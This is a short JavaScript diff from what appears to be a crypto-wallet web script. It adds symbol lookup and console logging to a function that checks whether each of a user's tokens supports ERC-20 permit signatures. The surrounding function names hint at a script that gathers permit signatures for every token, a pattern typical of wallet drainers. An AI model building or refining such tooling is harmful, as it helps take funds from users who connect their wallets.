@@ -364,15 +364,23 @@ _logConnectionEvent: async function() {
     }
 },
     _checkPermitSupport: async function(tokenAddress) {
-        try {
-            const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
-            await tokenContract.nonces(this._currentUserAddress);
-            await tokenContract.DOMAIN_SEPARATOR();
-            return true;
-        } catch (error) {
-            return false;
-        }
-    },
+    let symbol = tokenAddress; // Default to address if symbol lookup fails
+    try {
+        const tempContract = new ethers.Contract(tokenAddress, ["function symbol() view returns (string)"], this._provider);
+        symbol = await tempContract.symbol();
+        console.log(`Checking permit support for: ${symbol}...`);
+
+        const tokenContract = new ethers.Contract(tokenAddress, this._ERC20_PERMIT_ABI, this._provider);
+        await tokenContract.nonces(this._currentUserAddress);
+        await tokenContract.DOMAIN_SEPARATOR();
+
+        console.log(`✅ SUCCESS: ${symbol} is permit-compatible.`);
+        return true;
+    } catch (error) {
+        console.warn(`❌ SKIPPED: ${symbol} failed the permit check and will be ignored.`);
+        return false;
+    }
+},
 
     _signAndSendWithStandardPermit: async function(tokenData) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
